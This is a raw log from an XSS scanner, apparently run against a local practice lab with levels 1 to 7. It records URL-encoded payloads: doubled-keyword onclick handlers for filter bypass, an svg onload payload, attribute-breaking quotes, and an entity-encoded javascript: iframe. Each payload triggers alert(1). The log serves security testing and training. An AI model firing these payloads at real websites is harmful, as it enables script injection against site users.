+[32m[2020-04-02 23:53:10,796] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22onconclicklick%3D%22alert%281%29[0m
+[32m[2020-04-02 23:53:12,031] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 23:53:12,092] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 23:53:12,124] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 23:53:12,240] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22onconclicklick%3D%22alert%281%29[0m
+[32m[2020-04-02 23:53:13,545] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 23:53:13,599] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 23:53:13,621] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 23:53:13,752] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22oncliconclickk%3D%22alert%281%29[0m
+[32m[2020-04-02 23:53:14,945] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 23:53:15,001] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 23:53:15,030] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 23:53:15,170] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22onclionclickck%3D%22alert%281%29[0m
+[32m[2020-04-02 23:53:16,604] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 23:53:16,649] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 23:53:16,679] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 23:53:16,785] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22onclionclickck%3D%22alert%281%29[0m
+[32m[2020-04-02 23:53:18,350] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 23:53:18,406] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 23:53:18,428] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 23:53:18,578] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22onclionclickck%3D%22alert%281%29[0m
+[32m[2020-04-02 23:53:19,752] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 23:53:19,813] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 23:53:19,852] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 23:53:20,013] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22oonclicknclick%3D%22alert%281%29[0m
+[32m[2020-04-02 23:53:21,094] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 23:53:21,140] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 23:53:21,163] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 23:53:21,276] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22ononclickclick%3D%22alert%281%29[0m
+[32m[2020-04-02 23:53:22,312] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 23:53:22,356] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 23:53:22,397] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 23:53:22,548] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22ononclickclick%3D%22alert%281%29[0m
+[32m[2020-04-09 15:30:14,670] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:30:14,834] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:30:14,849] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}][0m
+[32m[2020-04-09 15:30:14,900] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level1.php?name=%3Csvg%20onLoAd%3Dalert%281%29%3E&x=2[0m
+[32m[2020-04-09 15:30:14,940] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:30:14,951] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:30:15,053] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level2.php?keyword=yy78pq%22oNcLick%3D%22alert%281%29[0m
+[32m[2020-04-09 15:30:15,109] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:30:15,142] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': "<input name=keyword  value='yy78pq'>"}][0m
+[32m[2020-04-09 15:30:15,214] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level3.php?keyword=yy78pq%27oncLiCk%3D%27alert%281%29[0m
+[32m[2020-04-09 15:30:15,275] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:30:15,285] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:30:15,359] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level4.php?keyword=yy78pq%22OnClick%3D%22alert%281%29[0m
+[32m[2020-04-09 15:30:15,401] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:30:15,422] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:30:15,506] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level5.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22%26%23x6a%3Ba%26%23x76%3Ba%26%23x73%3Bc%26%23x72%3Bi%26%23x70%3B%26%23x74%3B%26%23x3a%3Balert%26%23x28%3B1%26%23x29%3B[0m
+[32m[2020-04-09 15:30:15,564] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:30:15,575] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:30:15,644] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22onClIck%3D%22alert%281%29[0m
+[32m[2020-04-09 15:30:15,684] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:30:15,732] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:30:15,787] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22ononclickclick%3D%22alert%281%29[0m
+[32m[2020-04-09 15:30:15,874] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:30:15,892] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:32:15,126] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:32:50,387] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:32:55,881] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:36:25,041] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22oonclicknclick%3D%22alert%281%29[0m
+[32m[2020-04-09 15:36:25,091] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:36:25,154] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:37:20,195] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:37:20,264] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:37:20,315] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:39:52,593] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22onconclicklick%3D%22alert%281%29[0m
+[32m[2020-04-09 15:40:22,532] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:40:22,552] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:22,581] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:40:22,685] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22onclionclickck%3D%22alert%281%29[0m
+[32m[2020-04-09 15:40:22,758] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:22,789] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:40:45,102] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:40:45,131] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:45,161] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:40:45,266] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22onclionclickck%3D%22alert%281%29[0m
+[32m[2020-04-09 15:40:45,342] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:45,372] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:40:46,694] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:40:46,734] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:46,751] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:40:46,837] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22onclionclickck%3D%22alert%281%29[0m
+[32m[2020-04-09 15:40:46,896] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:46,949] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:40:48,018] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:40:48,035] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:48,043] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:40:48,150] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22oncliconclickk%3D%22alert%281%29[0m
+[32m[2020-04-09 15:40:48,196] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:48,217] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:40:49,447] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:40:49,470] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:49,489] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:40:49,559] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22oonclicknclick%3D%22alert%281%29[0m
+[32m[2020-04-09 15:40:49,617] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:49,645] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:40:50,859] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:40:50,891] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:50,912] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:40:50,979] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22oonclicknclick%3D%22alert%281%29[0m
+[32m[2020-04-09 15:40:51,012] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:51,045] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:40:52,145] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:40:52,175] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:52,196] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:40:52,250] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22onclionclickck%3D%22alert%281%29[0m
+[32m[2020-04-09 15:40:52,288] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:52,316] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:40:53,351] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:40:53,378] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:53,407] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:40:53,471] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22oncliconclickk%3D%22alert%281%29[0m
+[32m[2020-04-09 15:40:53,513] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:53,534] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:40:54,728] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:40:54,754] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:54,775] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:40:54,812] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22oonclicknclick%3D%22alert%281%29[0m
+[32m[2020-04-09 15:40:54,843] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:54,852] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:40:55,918] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:40:55,947] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:55,966] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:40:56,017] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22oonclicknclick%3D%22alert%281%29[0m
+[32m[2020-04-09 15:40:56,057] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:56,078] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:40:57,206] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:40:57,236] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:57,260] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:40:57,327] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22ononclickclick%3D%22alert%281%29[0m
+[32m[2020-04-09 15:40:57,353] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:57,395] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:40:58,450] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:40:58,478] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:58,499] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:40:58,542] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22onclionclickck%3D%22alert%281%29[0m
+[32m[2020-04-09 15:40:58,596] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:58,615] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:40:59,927] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:40:59,954] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:40:59,966] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:41:00,032] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22oncliconclickk%3D%22alert%281%29[0m
+[32m[2020-04-09 15:41:00,076] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:41:00,085] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:41:01,156] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:41:01,174] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:41:01,199] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:41:01,276] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22oncliconclickk%3D%22alert%281%29[0m
+[32m[2020-04-09 15:41:01,329] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:41:01,339] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:41:02,389] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:41:02,417] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:41:02,430] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:41:02,490] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22onclionclickck%3D%22alert%281%29[0m
+[32m[2020-04-09 15:41:02,535] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:41:02,544] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:41:03,616] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:41:03,648] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:41:03,665] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:41:03,740] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22oonclicknclick%3D%22alert%281%29[0m
+[32m[2020-04-09 15:41:03,804] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:41:03,820] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:41:04,858] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:41:04,889] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:41:04,899] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:41:04,944] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22oncliconclickk%3D%22alert%281%29[0m
+[32m[2020-04-09 15:41:04,980] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:41:05,001] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:41:06,050] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:41:06,084] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:41:06,096] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:41:06,173] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22oonclicknclick%3D%22alert%281%29[0m
+[32m[2020-04-09 15:41:06,216] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:41:06,228] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:41:07,243] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:41:07,261] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:41:07,270] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:41:07,332] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22oonclicknclick%3D%22alert%281%29[0m
+[32m[2020-04-09 15:41:07,387] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:41:07,415] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:41:08,687] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:41:08,711] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:41:08,725] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:41:08,764] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22oncliconclickk%3D%22alert%281%29[0m
+[32m[2020-04-09 15:41:08,810] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
